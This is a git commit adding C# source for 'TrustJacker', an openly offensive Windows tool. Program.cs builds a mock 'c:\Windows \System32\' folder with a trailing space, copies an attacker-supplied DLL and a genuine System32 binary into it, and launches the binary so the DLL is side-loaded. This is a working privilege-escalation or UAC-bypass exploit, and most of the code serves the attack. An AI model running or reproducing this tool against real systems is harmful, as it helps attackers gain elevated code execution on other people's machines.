ee70c936da78e28ff075cd0ec8716a50a0c8b0af
jfmaes <55604242+jfmaes@users.noreply.github.com>
2020-07-07 16:42:46 +0200

    Add files via upload

---
+++ Info.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace TrustJacker
+{ 
+    class Info
+    {
+        public static void PrintHeader()
+        {
+            Console.WriteLine(@" _______             _       _            _    ");
+            Console.WriteLine(@"|__   __|           | |     | |          | |   ");
+            Console.WriteLine(@"   | |_ __ _   _ ___| |_    | | __ _  ___| | __");
+            Console.WriteLine(@"   | | '__| | | / __| __|   | |/ _` |/ __| |/ /");
+            Console.WriteLine(@"   | | |  | |_| \__ \ || |__| | (_| | (__|   < ");
+            Console.WriteLine(@"   |_|_|   \__,_|___/\__\____/ \__,_|\___|_|\_\");
+            Console.WriteLine("\n\n V1.0.0 by https://twitter.com/Jean_Maes_1994 ");
+        }
+    }
+
+}
---
+++ Program.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Diagnostics;
+using NDesk.Options;
+
+namespace TrustJacker
+{
+    class Program
+    {
+        static String fakewindowsdir = "\"" + "c:\\Windows \\" + "\"";
+        static String legitdir = @"c:\Windows\System32\";
+
+        public static void ShowHelp(OptionSet p)
+        {
+            Console.WriteLine("Usage:");
+            p.WriteOptionDescriptions(Console.Out);
+        }
+
+        static void PopPopPop(String dllPath, String binary)
+        {
+            String[] dllName = dllPath.Split('\\');
+            Console.WriteLine("creating dir & copying the files...");
+            Process.Start("cmd.exe", @" /c mkdir " + fakewindowsdir + " && mkdir " + "\"" + @"c:\Windows \System32\" + "\"" + " && copy " + dllPath + " \"" + @"c:\Windows \System32\" + dllName[dllName.Length - 1] + "\"" +
+                " && copy " + legitdir + binary + " \"" + @"c:\Windows \System32\" + binary + "\"");
+
+            Console.WriteLine("popping the shell...");
+            Process.Start("cmd.exe","/c" + "\"" + @"c:\Windows \System32\" + binary + "\""); 
+        }
+
+        static void CleanUp()
+        {
+            Console.WriteLine("cleaning up...");
+            Process.Start("cmd.exe", @"/c rmdir " + fakewindowsdir + "/s /q");
+            Console.WriteLine("done!");
+        }
+        static void Main(string[] args)
+        {
+            var dllPath = String.Empty;
+            var binary = String.Empty;
+            var cleanup = false;
+            var help = false;
+
+            var options = new OptionSet()
+            {
+                {"dllpath=","Path to the dll on the computer", o => dllPath = o },
+                {"binary=","The binary name to pop the shell", o=> binary = o },
+                {"c|clean|cleanup","Cleanup the fake folder and its contents", o => cleanup = true },
+                {"h|?|help","show this help menu.", o => help = true }
+            };
+
+            Info.PrintHeader();
+
+            try
+            {
+                options.Parse(args);
+
+                if (help)
+                {
+                    ShowHelp(options);
+                    return;
+                }
+
+                if (!cleanup && (string.IsNullOrEmpty(dllPath) || string.IsNullOrEmpty(binary)))
+                {
+                    ShowHelp(options);
+                    return;
+                }
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine(e.Message);
+                ShowHelp(options);
+                return;
+            }
+            if(cleanup)
+                CleanUp();
+            else
+                PopPopPop(@dllPath, binary);
+          
+        }
+    }
+}
